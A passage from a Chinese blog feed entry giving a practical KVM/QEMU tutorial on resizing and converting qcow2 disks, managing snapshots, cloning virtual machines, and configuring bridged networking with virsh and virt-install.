class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img resize /opt/test.qcow2 +1G</span><br></pre></td></tr></table></figure><p>给test.qcow2添加1G<br>后面是容量指令，具体格式参考如下</p><ul><li>5G    大小调整到5G</li><li>+1G 大小增加1G</li><li>-1G 大小减小1G</li></ul><h2 id="RAW转换QCOW2"><a href="#RAW转换QCOW2" class="headerlink" title="RAW转换QCOW2"></a>RAW转换QCOW2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img convert -f raw -O qcow2 xxx.raw xxx.qcow2</span><br></pre></td></tr></table></figure><p>这个操作请在虚拟机关闭的状态下执行，执行之后会保留之前的文件然后生成新的qcow2文件。<br>然后转换之后如果想开机时使用QCOW2的镜像需要edit一下虚机的配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-img convert -f raw -O qcow2 centos.raw centos.qcow2</span><br><span class="line">virsh edit centos7</span><br></pre></td></tr></table></figure><p>大概在35行左右,原文如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">disk</span> <span class="attr">type</span>=<span class="string">&#x27;file&#x27;</span> <span class="attr">device</span>=<span class="string">&#x27;disk&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">driver</span> <span class="attr">name</span>=<span class="string">&#x27;qemu&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;raw&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">driver</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">file</span>=<span class="string">&#x27;/opt/centos.raw&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">target</span> <span class="attr">dev</span>=<span class="string">&#x27;vda&#x27;</span> <span class="attr">bus</span>=<span class="string">&#x27;virtio&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">address</span> <span class="attr">type</span>=<span class="string">&#x27;pci&#x27;</span> <span class="attr">domain</span>=<span class="string">&#x27;0x0000&#x27;</span> <span class="attr">bus</span>=<span class="string">&#x27;0x00&#x27;</span> <span class="attr">slot</span>=<span class="string">&#x27;0x06&#x27;</span> <span class="attr">function</span>=<span class="string">&#x27;0x0&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">disk</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改成下面这种效果</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">disk</span> <span class="attr">type</span>=<span class="string">&#x27;file&#x27;</span> <span class="attr">device</span>=<span class="string">&#x27;disk&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">driver</span> <span class="attr">name</span>=<span class="string">&#x27;qemu&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;qcow2&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">driver</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">file</span>=<span class="string">&#x27;/opt/centos.qcow2&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">target</span> <span class="attr">dev</span>=<span class="string">&#x27;vda&#x27;</span> <span class="attr">bus</span>=<span class="string">&#x27;virtio&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">address</span> <span class="attr">type</span>=<span class="string">&#x27;pci&#x27;</span> <span class="attr">domain</span>=<span class="string">&#x27;0x0000&#x27;</span> <span class="attr">bus</span>=<span class="string">&#x27;0x00&#x27;</span> <span class="attr">slot</span>=<span class="string">&#x27;0x06&#x27;</span> <span class="attr">function</span>=<span class="string">&#x27;0x0&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">disk</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="其他功能"><a href="#其他功能" class="headerlink" title="其他功能"></a>其他功能</h1><h2 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h2><h3 id="创建快照"><a href="#创建快照" class="headerlink" title="创建快照"></a>创建快照</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh snapshot-create centos7 --atomic --disk-only</span><br></pre></td></tr></table></figure><p>这里我们为虚拟机 centos7 创建了一个快照,使用了 <code>--atomic</code>表示如果失败则完全回滚,<code>--disk-only</code> 表示仅对磁盘创建快照。</p><h3 id="查看快照"><a href="#查看快照" class="headerlink" title="查看快照"></a>查看快照</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh snapshot-list centos7</span><br></pre></td></tr></table></figure><h3 id="恢复快照"><a href="#恢复快照" class="headerlink" title="恢复快照"></a>恢复快照</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh snapshot-revert centos7 snapshot1</span><br></pre></td></tr></table></figure><h3 id="删除快照"><a href="#删除快照" class="headerlink" title="删除快照"></a>删除快照</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh snapshot-delete centos7 snapshot1</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>在创建和管理快照时,可以添加选项控制快照类型(disk-only、system-checkpoint等)、是否包含内存状态等,灵活控制快照行为。</p><h2 id="克隆"><a href="#克隆" class="headerlink" title="克隆"></a>克隆</h2><h3 id="完整克隆"><a href="#完整克隆" class="headerlink" title="完整克隆"></a>完整克隆</h3><p>被克隆的主机一定要处于被挂起或者关闭的状态下<br>使用virt-clone工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@template opt]# virt-clone --auto-clone -o centos7 -n centos7-2</span><br><span class="line">Allocating <span class="string">&#x27;centos-clone.qcow2&#x27;</span>                      |  10 GB  00:00:09     </span><br><span class="line">Clone <span class="string">&#x27;centos7-2&#x27;</span> created successfully.</span><br></pre></td></tr></table></figure><p>手动克隆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-img convert -f qcow2 -O qcow2 -c centos.qcow2 centos2.qcow2</span><br><span class="line">virsh dumpxml centos7 &gt; centos7-2.xml</span><br></pre></td></tr></table></figure><p>编辑导出的xml,主要修改下面几个字段</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修改 domain.name # 名字</span><br><span class="line">删除 domain.uuid # uuid</span><br><span class="line">删除 domain.devices.interface.mac # mac地址</span><br><span class="line">修改 domain.devices.disk.source-file # 虚拟磁盘文件指定为新手动复制的。</span><br></pre></td></tr></table></figure><p>编辑好之后导入虚机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh define centos7-2.xml</span><br></pre></td></tr></table></figure><h3 id="链接克隆"><a href="#链接克隆" class="headerlink" title="链接克隆"></a>链接克隆</h3><p>连接克隆要注意的是不能使用RAW格式的磁盘，他是不支持的。<br>创建引用磁盘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f qcow2 -b centos.qcow2 centos3.qcow2</span><br></pre></td></tr></table></figure><p>此时去查看centos3.qcow2的信息如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@template opt]# qemu-img info centos3.qcow2              </span><br><span class="line">image: centos3.qcow2                                          file format: qcow2                                            virtual size: 10G (10737418240 bytes)                         disk size: 196K                                               cluster_size: 65536                                           backing file: centos.qcow2                                    </span><br><span class="line">Format specific information:                                      compat: 1.1                                                   lazy refcounts: <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>会发现这个字段<code>backing file: centos.qcow2</code><br>导出xml</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh dumpxml centos7 &gt; centos7-3.xml</span><br></pre></td></tr></table></figure><p>编辑导出的xml,主要修改下面几个字段</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修改 domain.name # 名字</span><br><span class="line">删除 domain.uuid # uuid</span><br><span class="line">删除 domain.devices.interface.mac # mac地址</span><br><span class="line">修改 domain.devices.disk.source-file # 虚拟磁盘文件指定为新手动复制的。</span><br></pre></td></tr></table></figure><p>编辑好之后导入虚机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh define centos7-3.xml</span><br></pre></td></tr></table></figure><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="桥接网卡"><a href="#桥接网卡" class="headerlink" title="桥接网卡"></a>桥接网卡</h3><p>如果想要将主机桥接到某个网络中则需要搞一个桥接网卡，可以通过下面命令进行桥接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh iface-bridge ens33 br0</span><br></pre></td></tr></table></figure><p>ens33是被桥接的网卡，br0是桥接之后的网卡，桥接的过程中可能会出现很多问题，我出现的问题是断网，然后开启网卡开启失败具体可以参考<a href="https://blog.csdn.net/m0_57949020/article/details/119984635">文章</a></p><h3 id="取消桥接"><a href="#取消桥接" class="headerlink" title="取消桥接"></a>取消桥接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh iface-unbridge br0</span><br></pre></td></tr></table></figure><h3 id="创建虚机指定网卡"><a href="#创建虚机指定网卡" class="headerlink" title="创建虚机指定网卡"></a>创建虚机指定网卡</h3><p>参数<code>--network network=default</code>是NAT模式，全部参数可以参考下面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virt-install --virt-type kvm --os-type=linux --os-variant rhel7 --name centos7 --memory 1024 --vcpus 1 --disk /opt/centos.raw,format=raw,size=10 --cdrom /opt/CentOS-7-x86_64-Minimal-1511.iso --network network=default --graphics vnc,listen=0.0.0.0 --noautoconsole</span><br></pre></td></tr></table></figure><p>参数<code>--network bridge=br0</code>是桥接模式，全部参数可以参考下面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virt-install --virt-type kvm --os-type=linux --os-variant rhel7 --name centos7 --memory 1024 --vcpus 1 --disk /opt/centos.raw,format=raw,size=10 --cdrom /opt/CentOS-7-x86_64-Minimal-1511.iso --network bridge=br0 --graphics vnc,listen=0.0.0.0 --noautoconsole</span><br></pre></td></tr></table></figure><h3 id="已有虚机更换网卡"><a href="#已有虚机更换网卡" class="headerlink" title="已有虚机更换网卡"></a>已有虚机更换网卡</h3><p>通过下面命令编辑配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh edit 虚机名</span><br></pre></td></tr></table></figure><p>修改<code>domain.devices.interface</code>字段，默认值如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">interface</span> <span class="attr">type</span>=<span class="string">&#x27;network&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mac</span> <span class="attr">address</span>=<span class="string">&#x27;52:54:00:25:a6:67&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">mac</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">network</span>=<span class="string">&#x27;default&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">model</span> <span class="attr">type</span>=<span class="string">&#x27;virtio&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">model</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">address</span> <span class="attr">type</span>=<span class="string">&#x27;pci&#x27;</span> <span class="attr">domain</span>=<span class="string">&#x27;0x0000&#x27;</span> <span class="attr">bus</span>=<span class="string">&#x27;0x00&#x27;</span> <span class="attr">slot</span>=<span class="string">&#x27;0x03&#x27;</span> <span class="attr">function</span>=<span class="string">&#x27;0x0&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改成下面这样</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">interface</span> <span class="attr">type</span>=<span class="string">&#x27;bridge&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mac</span> <span class="attr">address</span>=<span class="string">&#x27;52:54:00:25:a6:67&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">mac</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">bridge</span>=<span class="string">&#x27;br0&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">model</span> <span class="attr">type</span>=<span class="string">&#x27;virtio&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">model</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">address</span> <span class="attr">type</span>=<span class="string">&#x27;pci&#x27;</span> <span class="attr">domain</span>=<span class="string">&#x27;0x0000&#x27;</span> <span class="attr">bus</span>=<span class="string">&#x27;0x00&#x27;</span> <span class="attr">slot</span>=<span class="string">&#x27;0x03&#x27;</span> <span class="attr">function</span>=<span class="string">&#x27;0x0&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br></pre></td></tr></table></figure><p>主要是<code>interface</code>的<code>type</code>字段和<code>interface.source</code>的字段。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>每次桥接和取消桥接都会永久性的修改网卡的配置文件，这个需要注意。</p><h1 id="关于KVM创建的虚拟机"><a href="#关于KVM创建的虚拟机" class="headerlink" title="关于KVM创建的虚拟机"></a>关于KVM创建的虚拟机</h1><p>KVM虚拟机主要有两部分组成，一部分是磁盘文件，在创建的时候通过下面命令已经指定<br><code>--disk /opt/centos.raw,format=raw,size=10</code><br>另外一部分是配置文件，配置文件默认位置在<code>/etc/libvirt/qemu</code>中，一般采用dumpxml来导出，只要拥有xml和镜像文件就可以恢复虚机。</p>]]></content>
    
    
    <summary type="html">关于虚拟化技术
虚拟化是一种通过模拟计算机硬件，使一台计算机可以同时运行多个不同操作系统的技术。虚拟化极大地提高了硬件资源的利用率，同时降低了物理设备的成本和管理复杂性。

虚拟化软件的差别
qume 全虚拟化软件，特别慢但是兼容性特别好。
xen 半虚拟化软件，需要使用专门修改之后的内核，性能很高，兼容性很差。redhat在5.5的版本将xen替换成kvm
kvm 全虚拟化软件，它具有硬件支持cpu，内置在linux内核模块中，不需要使用专门的内核。性能好，兼容性好。
kvm的兼容性没有qume好，但是他比qume的性能好太多了
kvm的性能没有xen好，但是他比xen的兼容性好太多了

安</summary>
    
    
    
    <category term="工具相关" scheme="https://blog.boychai.xyz/categories/%E5%B7%A5%E5%85%B7%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="开源工具" scheme="https://blog.boychai.xyz/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/"/>
    
    <category term="kvm" scheme="https://blog.boychai.xyz/tags/kvm/"/>
    
    <category term="qemu" scheme="https://blog.boychai.xyz/tags/qemu/"/>
    
  </entry>
  
</feed>
